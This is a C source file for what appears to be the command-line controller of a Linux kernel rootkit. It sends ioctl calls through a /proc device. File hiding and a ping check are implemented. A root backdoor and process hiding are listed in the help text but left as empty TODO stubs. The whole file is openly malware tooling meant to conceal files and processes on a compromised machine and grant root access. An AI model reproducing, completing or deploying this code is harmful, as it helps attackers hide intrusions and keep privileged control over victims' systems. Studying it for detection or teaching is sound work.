#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <libgen.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>

#include "../ioctl.h"
#include "rkctl.h"

#define BUFLEN 4096

static char progname[BUFLEN];

int
main(int argc, char **argv)
{
    strcpy(progname, argc ? basename(argv[0]) : "");
    cmd_t cmd = parse_input(argc, argv);
    return cmd.f(cmd.arg);
}

cmd_t
parse_input(int argc, char **argv)
{
    if (argc <= 1 || ARGVCMP(1, "help")) {
        help();
        exit(0);
    }

    if (ARGVCMP(1, "ping"))
        return (cmd_t){ handle_ping, NULL };

    if (ARGVCMP(1, "filehide")) {
        ASSERT_ARGC(2, "filehide <toggle | on | off>");

        if (ARGVCMP(2, "toggle"))
            return (cmd_t){ handle_filehide, (void *)0 };

        if (ARGVCMP(2, "on"))
            return (cmd_t){ handle_filehide, (void *)1 };

        if (ARGVCMP(2, "off"))
            return (cmd_t){ handle_filehide, (void *)-1 };
    }

    if (ARGVCMP(1, "backdoor")) {
        ASSERT_ARGC(2, "backdoor <execve_command>");
        // TODO: return backdoor handle
    }

    if (ARGVCMP(1, "backdoor-use-tty")) {
        ASSERT_ARGC(2, "backdoor-use-tty <0 | 1>");
        // TODO: return backdoor-use-tty handle
    }

    if (ARGVCMP(1, "hidepid")) {
        ASSERT_ARGC(3, "hidepid <add | remove> <PID>");
        // TODO: return hidepid handle
    }

    help();
    exit(1);
}

int
handle_ping(void *arg)
{
    return issue_ioctl(G7_PING, "PING");
}

int
handle_filehide(void *arg)
{
    return issue_ioctl(G7_FILEHIDE, (const char *)arg);
}

int
handle_backdoor_execve(void *arg)
{
}

int
handle_backdoor_toggle(void *arg)
{
}

int
handle_hidepid(void *arg)
{
}

int
issue_ioctl(unsigned long request, const char *argp)
{
    int fd;
    char device[BUFLEN];
    sprintf(device, "/proc/%s", G7_DEVICE);

    if ((fd = open(device, O_RDWR)) < 0) {
        fprintf(stderr, "%s: unable to open %s, is the rootkit running?\n", progname, device);
        exit(1);
    }

    int ret = ioctl(fd, request, argp);
    close(fd);

    return ret;
}

void
help()
{
    printf("usage: %s <command>\n\n", progname);
    printf("These are the available commands:\n");
    printf("%-32s %s\n", "help", "this message");
    printf("%-32s %s\n", "ping", "send an echo request to the rootkit");
    printf("%-32s %s\n", "filehide <toggle | on | off>", "{,un}hide files");
    printf("%-32s %s\n", "backdoor <execve_command>", "exec a command as root");
    printf("%-32s %s\n", "backdoor-use-tty <0 | 1>", "listen for `make_me_root` on read (0) or tty (1)");
    printf("%-32s %s\n", "hidepid <add | remove> <PID>", "{,un}hide a process");
}
